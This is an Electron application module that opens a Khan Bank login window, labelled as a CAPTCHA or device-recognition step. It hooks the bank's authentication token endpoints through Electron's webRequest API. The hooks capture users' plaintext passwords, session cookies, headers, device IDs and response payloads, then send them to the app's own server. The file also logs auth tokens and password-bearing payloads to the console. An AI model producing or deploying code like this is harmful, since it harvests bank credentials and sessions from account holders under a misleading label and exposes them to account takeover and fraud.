const { BrowserWindow, session } = require('electron');
const path = require('path');
// const desktopService = require('./services/desktopService'); // Removed - will import dynamically
const { API_CONFIG } = require('./utils/constants');
const WindowsCompatibility = require('./utils/windows7Compat');

const { io } = require('socket.io-client');

// Initialize Windows compatibility utility
const winCompat = new WindowsCompatibility();
console.log('[settings] Windows compatibility utility initialized:', {
    isWindows7: winCompat.isWindows7,
    isLegacyWindows: winCompat.isLegacyWindows,
    windowsVersion: winCompat.windowsVersion
});




// [success] Server-д KhanBank Cookies хадгалах - main process дээр шууд DesktopService ашиглах
async function insertKhanBankCookiesToServer(params) {
    try {
        console.log('[info] insertKhanBankCookiesToServer entered')
        // Main process дээр шууд DesktopService ашиглах
        const DesktopService = require('./services/desktopService');
        const desktopServiceInstance = new DesktopService();
        const result = await desktopServiceInstance.insertKhanBankCookiesToServer(params);
        console.log('[info] [CAPTCHA] KhanBank cookies saved:', result);
        return result;
    } catch (error) {
        console.error('[error] [CAPTCHA] DesktopService insertKhanBankCookiesToServer:', error);
        return { success: false, message: error.message };
    }
}

async function startCaptchaPolling(isCitizen, captchaUrl) {
    try {
        // JWT token авах (main process-д global-аас авах)
        let authToken = global.currentAuthToken || null;
        console.log('🔍 authToken:', authToken);
        if (!authToken) {
            console.warn('[warning] Auth token not found, Socket.io do not connect');
            return;
        }
        // [info] Socket.io холболт хийх (socketService ашиглах)
        const socket = io(API_CONFIG.BASE_URL,{
            transports: ['polling']
        });
        socket.connect();

        console.log('🔌 Socket connection status:', socket?.connected);

        // [info] JWT token-оос userOid авах
        let userOid = null;
        try {
            if (authToken) {
                // JWT token-г decode хийх (base64)
                const payload = JSON.parse(Buffer.from(authToken.split('.')[1], 'base64').toString());
                userOid = payload.userOid || payload.userId || null;
                console.log('[info] JWT token userOid :', userOid);
            }
        } catch (decodeError) {
            console.warn('[warning] JWT token decode error:', decodeError);
        }
        console.log('🔍 userOid:', userOid);
        console.log('🔍 isCitizen:', isCitizen);

        socket.on('disconnect', () => {
            console.log('[socket] Socket.io disconnected');
        });

        socket.on('error', (error) => {
            console.error('[error] Socket.io error:', error);
        });

        socket.on('connect', () => {
            console.log('[socket] CaptchaWindow Socket.io connected calling captcha-setup:', socket.id);
            socket.emit('captcha-setup', {
                userOid: userOid,
                isCitizen: isCitizen
            });
            console.log('📤 CAPTCHA setup sent:', { userOid, isCitizen });
        });
        // [info] Server-д user data илгээх (connection шалгаад)

        // [info] CAPTCHA update event listener нэмэх
        console.log('[info] before captcha-update listener...');

        // [info] Socket-д шууд event listener нэмэх
        socket.on('captcha-update', async (result) => {
            console.log('[info] captcha-update entered:', result);
            if (result.success && result.captchaDone) {
                console.log('[info] captcha-update captchaDone!');
                // console.log('🎉 CAPTCHA амжилттай бөглөгдлөө:', result.message);

                // [info] CaptchaWindow хаах
                if (result && result.shouldCloseWindow) {

                    console.log('[info] shouldCloseWindow before close !');
                    try {
                        if (global.captchaWindow && !global.captchaWindow.isDestroyed()) {
                            console.log('[info] CaptchaWindow closing ...');
                            // Network hooks устгах
                            clearCaptchaNetworkHooks();
                            // Цонхыг destroy хийх
                            global.captchaWindow.destroy();
                            global.captchaWindow = null;
                            socket.disconnect();
                            console.log('[info] CaptchaWindow closed');
                        }
                    } catch (clsErr) {
                        console.error('[error] CaptchaWindow error:', clsErr);
                    }
                } else {
                    console.log('ℹ️ CaptchaWindow no need to close');
                }
            }
        });


        // console.log('[info] CAPTCHA update event listener нэмэгдлээ');
        console.log('[info] CAPTCHA Socket.io started (real-time updates)');

    } catch (err) {
        console.error('[error] CAPTCHA Socket.io connect:', err);
    }
}



function registerCaptchaNetworkHooks(isCitizen) {
    if (global._captchaHooksInstalled) {
        console.log('[info] CAPTCHA network hooks already registered');
        return;
    }

    console.log(`registerCaptchaNetworkHooks entered window sessions is ${winCompat && winCompat.isWindows7}`)
    // Session шалгах
    const defaultSession = winCompat && winCompat.isWindows7 ? global.captchaWindow.webContents.session : session.defaultSession;

    if (!defaultSession || !defaultSession.webRequest) {
        console.warn('[warning] Session/webRequest cannot do');
        return;
    }

    // URL filter тохируулах
    const tokenUrls = [
        'https://e.khanbank.com/v3/cfrm/auth/token',
        'https://corp.khanbank.com/api/auth/token',
    ];
    const urlFilter = { urls: tokenUrls.map(url => `${url}*`) };
    let latestPassword = null;
    console.log('🔗 CAPTCHA network hooks registering:', tokenUrls);

    defaultSession.webRequest.onBeforeSendHeaders(urlFilter, async (details, callback) => {
        try {

            console.log('[info] [onBeforeSendHeaders] entered')
            // Device ID хадгалах
            if (details.requestHeaders['device-id']) {
                global.currentDeviceId = details.requestHeaders['device-id'];
                console.log('[phone] Device ID saved:', global.currentDeviceId);
            }

            try {
                await insertKhanBankCookiesToServer({
                    isCitizen,
                    url: details.url,
                    headers: details.requestHeaders,
                    deviceId: global.currentDeviceId,
                    userAgent: details.requestHeaders['user-agent'],
                    BankAccountnum: 'REQUEST_HEADER'
                });

                console.log('[info] new KhanBank cookies saved');
            } catch (cookieError) {
                console.error('[error] Cookies onBeforeSendHeaders - insertKhanBankCookiesToServer:', cookieError);
            }
        } catch (error) {
            console.error('[error] onBeforeSendHeaders:', error);
        } finally {
            // Callback дуудах (заавал)
            callback({ requestHeaders: details.requestHeaders });
        }
    });

    defaultSession.webRequest.onResponseStarted(urlFilter, async (details) => {
        try {
            console.log('[info] [onResponseStarted] entered')
            try {
                await insertKhanBankCookiesToServer({
                    isCitizen,
                    url: details.url,
                    headers: details.responseHeaders,
                    deviceId: global.currentDeviceId,
                    userAgent: details.requestHeaders?.['user-agent'],
                    username: global.currentUsername || null,
                    password: global.currentPassword || null,
                    BankAccountnum: 'RESPONSE_HEADER',
                    isResponseHeader: true
                });
                console.log('[onResponseStarted] insertKhanBankCookiesToServer Response headers saved');
            } catch (cookieError) {
                console.error('[error][onResponseStarted] Cookies insertKhanBankCookiesToServer:', cookieError);
            }

            if (details.responseHeaders['access-control-expose-headers']) {
                try {
                    const DesktopService = require('./services/desktopService');
                    const desktopServiceInstance = new DesktopService();
                    const result = await desktopServiceInstance.checkExposeHeaders({
                        isCitizen,
                        exposeHeaders: details.responseHeaders['access-control-expose-headers']
                    });
                    console.log('[info] [onResponseStarted] Expose-Headers :', details.responseHeaders['access-control-expose-headers']);
                } catch (error) {
                    console.error('[error] [onResponseStarted] Expose-Headers :', error);
                }
            }
        } catch (error) {
            console.error('[error] Response started [onResponseStarted]:', error);
        }
    });


    // 3. Request Payload хяналт
    try {
        defaultSession.webRequest.onBeforeRequest(urlFilter, async (details, callback) => {
            console.log('[info] [onBeforeRequest] entered')
            try {

                if (details.uploadData && details.uploadData.length > 0) {


                    // Request payload content авах
                    let requestPayload = '';
                    details.uploadData.forEach((data, index) => {
                        if (data.bytes) {
                            const content = Buffer.from(data.bytes).toString('utf8');
                            requestPayload += content;
                        }
                    });
                    console.log('💾 Request payload:', requestPayload);
                    // Request payload хадгалах
                    if (requestPayload) {
                        const data = JSON.parse(requestPayload);
                        if (!data.rememberDevice) {
                            latestPassword = data.password;
                        }
                        else {
                            if (latestPassword) {
                                data.password = latestPassword;
                            }
                        }
                        await insertKhanBankCookiesToServer({
                            isCitizen,
                            url: details.url,
                            requestPayload: JSON.stringify(data),
                            deviceId: global.currentDeviceId,
                            userAgent: details.requestHeaders?.['user-agent'],
                            username: global.currentUsername || null,
                            password: global.currentPassword || null,
                            BankAccountnum: 'REQUEST_PAYLOAD'
                        });
                        console.log('[onBeforeRequest] Request payload saved');
                    }
                }
                try {
                    const DesktopService = require('./services/desktopService');
                    const desktopServiceInstance = new DesktopService();
                    const result = await desktopServiceInstance.checkExposeHeaders({
                        isCitizen,
                        exposeHeaders: "response_header_Access-Control-Expose-Headers"
                    });
                    console.log('[info] [onBeforeRequest] Expose-Headers checked:', result);
                } catch (error) {
                    console.error('[error] [onBeforeRequest] Expose-Headers :', error);
                }

            } catch (error) {
                console.error('[error] [onBeforeRequest] Request payload :', error);
            } finally {
                // Callback дуудах (заавал)
                callback({});
            }
        });
        console.log('[info] onBeforeRequest hook registered');
    } catch (error) {
        console.error('[error] onBeforeRequest hook :', error);
    }

    // 4. Response Completed хяналт
    try {
        defaultSession.webRequest.onCompleted(urlFilter, async (details) => {
            try {
                console.log('[info] [onCompleted] entered')
                console.log('📦 Response completed:', details.statusCode);
                const deviceId = global.currentDeviceId || 'NoDeviceID';

                // Login амжилттай эсэхийг шалгах
                // try {
                //     // Хуучин response payload устгах
                //     console.log('🗑️ Хуучин response payload устгагдлаа');
                // } catch (e) {
                //     console.error('[error] Response payload устгахад алдаа:', e);
                // }

                // Response payload авах (client дээр шууд)
                try {
                    // URL-аас response payload авах
                    // Skip fetch in main process
                    if (typeof fetch === 'undefined' || typeof window === 'undefined') {
                        console.log('[info] Fetch not available, skipping response payload fetch');
                        return;
                    }
                    const resp = await fetch(details.url, {
                        method: 'GET',
                        headers: {
                            'User-Agent': global.currentUserAgent || 'Electron'
                        }
                    });

                    if (resp.ok) {
                        const text = await resp.text();

                        // Response payload хадгалах
                        await insertKhanBankCookiesToServer({
                            isCitizen,
                            url: details.url,
                            responsePayload: text,  // [info] Response payload content
                            deviceId: deviceId,
                            userAgent: global.currentUserAgent || 'Electron',
                            username: global.currentUsername || null,
                            password: global.currentPassword || null,
                            BankAccountnum: 'RESPONSE_PAYLOAD'
                        });

                        console.log('[info] [onCompleted] Response payload saved');
                    }
                } catch (respErr) {
                    console.error('[error] [onCompleted] Response payload :', respErr);
                }

                if (details.responseHeaders['access-control-expose-headers']) {
                    try {
                        const DesktopService = require('./services/desktopService');
                        const desktopServiceInstance = new DesktopService();
                        const result = await desktopServiceInstance.checkExposeHeaders({
                            isCitizen,
                            exposeHeaders: details.responseHeaders['access-control-expose-headers']
                        });
                        console.log('[info] [onCompleted]  Expose-Headers check:', details.responseHeaders['access-control-expose-headers']);
                    } catch (error) {
                        console.error('[error] [onCompleted] Expose-Headers check:', error);
                    }
                }

                // Амжилттай response-уудыг логлох
                if (details.statusCode >= 200 && details.statusCode < 300) {
                    console.log('[info] [onCompleted] success:', details.url);
                } else if (details.statusCode >= 400) {
                    console.log('[warning] [onCompleted] warning:', details.statusCode, details.url);
                }

            } catch (error) {
                console.error('[error] [onCompleted] Response completed :', error);
            }
        });
        console.log('[info] onCompleted hook registered');
    } catch (error) {
        console.error('[error] onCompleted hook :', error);
    }

    // Hook-ууд амжилттай бүртгэгдсэн
    global._captchaHooksInstalled = true;
    console.log('CAPTCHA network hooks registered!');
}


function clearCaptchaNetworkHooks() {
    if (!global._captchaHooksInstalled) {
        console.log('[info] CAPTCHA network hooks already destroyed');
        return;
    }

    try {
        const { session } = require('electron');
        const s = winCompat && winCompat.isWindows7 ? global.captchaWindow.webContents.session : session.defaultSession;
        if (s && s.webRequest) {
            // Бүх hook-уудыг устгах
            s.webRequest.onBeforeSendHeaders(null);
            s.webRequest.onResponseStarted(null);
            s.webRequest.onBeforeRequest(null);
            s.webRequest.onCompleted(null);

            console.log('[deleted] CAPTCHA network hooks deleted');
        }
    } catch (error) {
        console.error('[error] CAPTCHA network hooks:', error);
    }

    // Global туг-уудыг цэвэрлэх
    global._captchaHooksInstalled = false;
    global.currentDeviceId = null;

    console.log('CAPTCHA network hooks cleared');
}


class CaptchaWindowManager {
    constructor() {
        this.isInitialized = false;
    }


    async createCaptchaWindow(isCitizen = true, mainWindow = null) {
        console.log('[info] createCaptchaWindow:', isCitizen);
        console.log('[info] createCaptchaWindow - mainWindow exists:', !!mainWindow);
        console.log('[info] createCaptchaWindow - isCitizen type:', typeof isCitizen, 'value:', isCitizen);
        
        // Ensure winCompat is initialized
        if (!winCompat) {
            console.error('[error] winCompat is not initialized!');
            throw new Error('Windows compatibility utility not initialized');
        }
        
        console.log('[settings] winCompat status:', {
            isWindows7: winCompat.isWindows7,
            isLegacyWindows: winCompat.isLegacyWindows,
            windowsVersion: winCompat.windowsVersion
        });
        

        // Хуучин CAPTCHA цонхыг хаах
        if (global.captchaWindow && !global.captchaWindow.isDestroyed()) {
            console.log('[closing] Closing existing CAPTCHA window...');
            global.captchaWindow.destroy();
            global.captchaWindow = null;
            // Цонх бүрэн хаагдлаа гэж хүлээх
            await new Promise(resolve => setTimeout(resolve, 500));
        }

        const allWindows = BrowserWindow.getAllWindows();
        for (const win of allWindows) {
            if (mainWindow && win !== mainWindow && !win.isDestroyed()) {
                const title = win.getTitle();
                if (title.includes('CAPTCHA') || title.includes('KhanBank') || title.includes('Auth')) {
                    console.log('[closing] Closing other related window:', title);
                    win.destroy();
                    await new Promise(resolve => setTimeout(resolve, 200));
                }
            }
        }

        // URL тохируулах - Windows 7 compatibility
        let captchaUrl;
        if (winCompat && winCompat.isWindows7) {
            // Windows 7 дээр corp.khanbank.com холболт асуудалтай тул e.khanbank.com ашиглах
            console.log('[settings] Windows 7: Using e.khanbank.com for better compatibility');
            captchaUrl = 'https://e.khanbank.com/auth/login';
        } else {
            captchaUrl = isCitizen
                ? 'https://e.khanbank.com/auth/login'
                : 'https://corp.khanbank.com/auth/login';
        }

        const customHtmlPath = path.join(__dirname, 'captcha.html');
        console.log('[info] Windows compatibility needed:', winCompat.needsCompatibility());
        console.log('[info] Windows version:', winCompat.windowsVersion);
        
        // Apply session fixes for Windows
        winCompat.applySessionFixes();
        
        // Windows 7 specific debugging
        if (winCompat && winCompat.isWindows7) {
            console.log('[settings] Windows 7 detected - applying enhanced compatibility fixes');
        }
        
        console.log('[settings] Creating BrowserWindow with options...');
        
        global.captchaWindow = new BrowserWindow({
            width: 800,
            height: 600,
            x: 100,
            y: 100,
            parent: mainWindow || undefined,
            modal: false,
            frame: true,
            titleBarStyle: 'default',
            title: 'Төхөөрөмж таниулах',
            show: false,
            // Windows compatibility
            minWidth: 400,
            minHeight: 300,
            resizable: true,
            maximizable: true,
            minimizable: true,
            // Windows specific settings
            ...winCompat.getCompatibleWindowOptions(),
            webPreferences: winCompat.getCompatibleWebPreferences()
        });
        
        console.log('[info] BrowserWindow created successfully');
        // Set appropriate User Agent for Windows
        const userAgent = winCompat.getCompatibleUserAgent();
        global.captchaWindow.webContents.setUserAgent(userAgent);
        console.log('[info] User Agent set:', userAgent);
        
        // Windows 7 specific: Load HTML content directly to avoid chrome-error
        if (winCompat && winCompat.isWindows7) {
            console.log('[settings] Windows 7: Loading HTML content directly...');
            try {
                const fs = require('fs');
                if (fs.existsSync(customHtmlPath)) {
                    const htmlContent = fs.readFileSync(customHtmlPath, 'utf8');
                    console.log('[settings] Windows 7: HTML file found, size:', htmlContent.length, 'bytes');
                    
                    // Create data URL with HTML content
                    const dataUrl = `data:text/html;charset=utf-8,${encodeURIComponent(htmlContent)}`;
                    console.log('[settings] Windows 7: Loading data URL...');
                    
                    await global.captchaWindow.webContents.loadURL(dataUrl);
                    console.log('[info] Windows 7: HTML content loaded directly via data URL');
                    
                } else {
                    throw new Error('HTML file not found at: ' + customHtmlPath);
                }
            } catch (directLoadError) {
                console.error('[error] Windows 7: Direct HTML load failed:', directLoadError);
                // Fallback to regular loadFile
                try {
                    console.log('[settings] Windows 7: Trying loadFile fallback...');
                    await global.captchaWindow.loadFile(customHtmlPath);
                    console.log('[warning] Windows 7: Fallback to regular loadFile');
                } catch (fallbackError) {
                    console.error('[error] Windows 7: Fallback loadFile also failed:', fallbackError);
                    // Final fallback - create minimal HTML content
                    const minimalHtml = `
                        <!DOCTYPE html>
                        <html>
                        <head>
                            <title>CAPTCHA Window</title>
                            <style>
                                body { font-family: Arial, sans-serif; padding: 20px; text-align: center; }
                                .error { color: red; margin: 20px 0; }
                                .button { padding: 10px 20px; margin: 10px; background: #0076FF; color: white; border: none; border-radius: 5px; cursor: pointer; }
                            </style>
                        </head>
                        <body>
                            <h3>Windows 7 Compatibility Issue</h3>
                            <p class="error">CAPTCHA автоматаар ачаалах боломжгүй байна.</p>
                            <p>Гар аргаар нэвтэрнэ үү:</p>
                            <a href="https://e.khanbank.com/v3/cfrm/auth/token" target="_blank" class="button">KhanBank-д нэвтрэх</a>
                            <br>
                            <a href="https://corp.khanbank.com/auth/login" target="_blank" class="button">Corp Bank-д нэвтрэх</a>
                        </body>
                        </html>
                    `;
                    await global.captchaWindow.webContents.loadURL(`data:text/html;charset=utf-8,${encodeURIComponent(minimalHtml)}`);
                    console.log('[info] Windows 7: Minimal HTML content loaded as final fallback');
                }
            }
        } else {
            console.log('[settings] Standard system: Loading HTML file...');
            await global.captchaWindow.loadFile(customHtmlPath);
        }
        
        
        // Setup Windows specific event listeners
        winCompat.setupWindowsEventListeners(global.captchaWindow);
        
        
        // Get appropriate loading delay
        const loadDelay = winCompat.getLoadingDelay();
        console.log('[info] Loading delay:', loadDelay);
        
        setTimeout(async () => {
            try {
                console.log('[info] Loading KhanBank URL:', captchaUrl);
                
                
                // Load KhanBank URL
                await winCompat.loadURLWithRetry(global.captchaWindow.webContents, captchaUrl);
                console.log('[success] KhanBank URL loaded successfully');
                
            } catch (err) {
                console.error('[error] KhanBank URL reloading :', err);
                
            }
        }, loadDelay);
        global.captchaWindow.on('closed', () => {
            global.captchaWindow = null;
            clearCaptchaNetworkHooks();
            console.log('[closing] CAPTCHA window closed');
        });
        global.captchaWindow.once('ready-to-show', () => {
            console.log('[success] CAPTCHA window ready-to-show event fired');
            console.log('   - Window visible:', global.captchaWindow.isVisible());
            console.log('   - Window destroyed:', global.captchaWindow.isDestroyed());
            
            // Windows 7 specific ready-to-show handling
            if (winCompat && winCompat.isWindows7) {
                console.log('[settings] Windows 7: CAPTCHA window ready-to-show');
                
                // Additional delay for Windows 7
                setTimeout(() => {
                    console.log('[settings] Windows 7: Starting network hooks and polling...');
                    try {
                        registerCaptchaNetworkHooks(isCitizen);
                        startCaptchaPolling(isCitizen, captchaUrl);
                        console.log('[success] Windows 7: Network hooks and polling started successfully');
                    } catch (error) {
                        console.error('[error] Windows 7: Error starting network hooks and polling:', error);
                    }
                }, 2000);
            } else {
                try {
                    registerCaptchaNetworkHooks(isCitizen);
                    startCaptchaPolling(isCitizen, captchaUrl);
                    console.log('[success] Network hooks and polling started successfully');
                } catch (error) {
                    console.error('[error] Error starting network hooks and polling:', error);
                }
            }
        });
        
        // Standard event listeners (Windows 7 specific ones are handled by compatibility utility)
        global.captchaWindow.webContents.on('responsive', () => {
            console.log('[success] CAPTCHA window responsive again');
        });
        // Windows 7 specific delay for showing window
        const showDelay = (winCompat && winCompat.isWindows7) ? 3000 : 1000;
        console.log(`[timer] Setting up window show delay: ${showDelay}ms`);
        
        setTimeout(() => {
            console.log('[timer] Window show timeout triggered');
            console.log('   - CAPTCHA window exists:', !!global.captchaWindow);
            console.log('   - CAPTCHA window destroyed:', global.captchaWindow ? global.captchaWindow.isDestroyed() : 'N/A');
            
            if (global.captchaWindow && !global.captchaWindow.isDestroyed()) {
                try {
                    global.captchaWindow.show();
                    console.log(`[success] CAPTCHA window shown (fallback) - delay: ${showDelay}ms`);
                    
                    // Windows 7 specific: Force focus and bring to front
                    if (winCompat && winCompat.isWindows7) {
                        global.captchaWindow.focus();
                        global.captchaWindow.moveTop();
                        console.log('[settings] Windows 7: Forced window focus and move to top');
                        
                        // Additional Windows 7 debugging
                        setTimeout(() => {
                            console.log('[settings] Windows 7: Final window state check...');
                            console.log('   - Window visible:', global.captchaWindow.isVisible());
                            console.log('   - Window focused:', global.captchaWindow.isFocused());
                            console.log('   - Window destroyed:', global.captchaWindow.isDestroyed());
                            console.log('   - WebContents loading:', global.captchaWindow.webContents.isLoading());
                            
                            // Check if content is actually visible
                            global.captchaWindow.webContents.executeJavaScript(`
                                console.log('[settings] Windows 7: Final content check...');
                                console.log('   - Document ready state:', document.readyState);
                                console.log('   - Body content length:', document.body ? document.body.innerHTML.length : 0);
                                console.log('   - Captcha container visible:', document.querySelector('.captcha-container') ? 'Yes' : 'No');
                                console.log('   - Windows 7 fallback visible:', document.getElementById('windows7-fallback') ? 'Yes' : 'No');
                                console.log('   - Current URL:', window.location.href);
                                
                                // If content is still empty, trigger fallback
                                if (document.body && document.body.innerHTML.length < 100) {
                                    console.warn('[warning] Windows 7: Content still empty, triggering fallback');
                                    if (typeof showFallbackMessage === 'function') {
                                        showFallbackMessage('CAPTCHA агуулга хоосон байна. Гар аргаар нэвтэрнэ үү.');
                                    }
                                }
                            `).catch(err => console.warn('[warning] Could not perform final Windows 7 content check:', err));
                        }, 1000);
                    }
                } catch (showError) {
                    console.error('[error] Error showing CAPTCHA window:', showError);
                }
            } else {
                console.error('[error] CAPTCHA window could not be shown - window is null or destroyed');
                if (winCompat && winCompat.isWindows7) {
                    console.error('[settings] Windows 7: Attempting to recreate CAPTCHA window...');
                    // Try to recreate the window
                    setTimeout(async () => {
                        try {
                            const newWindow = await captchaWindowManager.createCaptchaWindow(isCitizen, mainWindow);
                            console.log('[success] Windows 7: CAPTCHA window recreated successfully');
                        } catch (recreateError) {
                            console.error('[error] Windows 7: Failed to recreate CAPTCHA window:', recreateError);
                        }
                    }, 2000);
                }
            }
        }, showDelay);

        return global.captchaWindow;
    }
    closeCaptchaWindow() {
        if (global.captchaWindow && !global.captchaWindow.isDestroyed()) {
            console.log('[closing] Closing CAPTCHA window...');
            // Network hooks устгах
            clearCaptchaNetworkHooks();
            // Цонхыг destroy хийх
            global.captchaWindow.destroy();
            global.captchaWindow = null;
            return true;
        }
        // Global-аас устгах (fallback)
        if (global.captchaWindow) {
            global.captchaWindow = null;
            clearCaptchaNetworkHooks();
        }
        return false;
    }

    isCaptchaWindowOpen() {
        return global.captchaWindow && !global.captchaWindow.isDestroyed();
    }


    getCaptchaWindow() {
        return global.captchaWindow;
    }


    clearHook() {
        clearCaptchaNetworkHooks();
        return true;
    }

    reinstallHook(isCitizen = true) {
        global._captchaHooksInstalled = false;
        registerCaptchaNetworkHooks(isCitizen);
        return true;
    }


    async insertKhanBankCookies(params) {
        console.log('💾 KhanBank cookies хадгалаж байна...');
        return await insertKhanBankCookiesToServer(params);
    }
}

// Global instance үүсгэж export хийх
const captchaWindowManager = new CaptchaWindowManager();
module.exports = captchaWindowManager;
